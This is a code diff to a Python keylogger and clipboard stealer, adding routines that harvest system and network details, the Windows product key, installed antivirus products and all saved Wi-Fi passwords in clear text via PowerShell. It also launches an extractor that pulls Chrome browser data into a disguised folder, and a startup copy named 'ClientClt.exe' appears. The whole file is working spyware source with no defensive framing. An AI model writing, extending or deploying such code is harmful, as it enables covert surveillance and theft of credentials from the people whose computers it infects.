@@ -1,14 +1,21 @@
 from pynput import keyboard
-import time, threading, pyperclip, shutil, os
+import time, threading, pyperclip, shutil, os, subprocess
 from pathlib import Path
 
 kelogger_data = []
-clipboard_data = ['']
+clipboard_data = []
+system_info_data = []
 current_data_pos = 0
 has_been_pressed = False
 keylogger_wait_time = 3
 clipboard_wait_time = 3
 startup_file_name = "ClientClt.exe"
+browser_data_path = r'C:\ProgramData\ConfigLogs\sys32\\'
+system_info_commands = ['Invoke-RestMethod "https://ipinfo.io/json"', 'Get-NetIPConfiguration',
+                        '(Get-CimInstance -ClassName SoftwareLicensingService).OA3OriginalProductKey',
+                        'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName, productState, pathToSignedProductExe',
+                        'systeminfo | findstr /B /C:"Host Name" /C:"Domain"',
+                        '''(netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $n=($_ -split ':',2)[1].Trim(); $p=netsh wlan show profile name="$n" key=clear; $k=$p | Select-String 'Key Content'; "$n : " + $(if($k){($k -split ':',2)[1].Trim()}else{'<no password>'}) }''']
 
 
 def on_press(key):
@@ -31,7 +38,8 @@ def on_press(key):
         else:
             # others
             return
-
+    if formated is None or formated == "":
+        return
     if len(kelogger_data) > current_data_pos:
         kelogger_data[current_data_pos] += formated
     else:
@@ -56,8 +64,10 @@ def copy_clipboard():
 
 def clipboard_checker():
     global clipboard_data
-    if copy_clipboard() != clipboard_data[-1]:
-        clipboard_data.append(copy_clipboard())
+    clipboard_value = copy_clipboard()
+    if clipboard_value != "":
+        if clipboard_data == [] or clipboard_value != clipboard_data[-1]:
+            clipboard_data.append(copy_clipboard())
     time.sleep(clipboard_wait_time)
     clipboard_checker()
 
@@ -71,6 +81,26 @@ def create_schedule_task():
     if not final_path.is_file():
         shutil.copy(path, final_path)
 
+
+def get_system_info():
+    global system_info_data
+    for command in system_info_commands:
+        proc = subprocess.run(["powershell", "-Command", command],
+                              capture_output=True,
+                              text=True)
+        system_info_data.append(command + '\n' + proc.stdout)
+
+
+def get_chromium_browsers_data():
+    path = Path(__file__).parent / "chromiumExtractor.exe"
+    subprocess.run([path] + ["chrome", '-o', browser_data_path])
+
+
+# get Chromium browser data
+threading.Thread(target=get_chromium_browsers_data, daemon=True).start()
+
+# get system info
+threading.Thread(target=get_system_info, daemon=True).start()
 
 # add exe to autostart
 # threading.Thread(target=create_schedule_task, daemon=True).start()
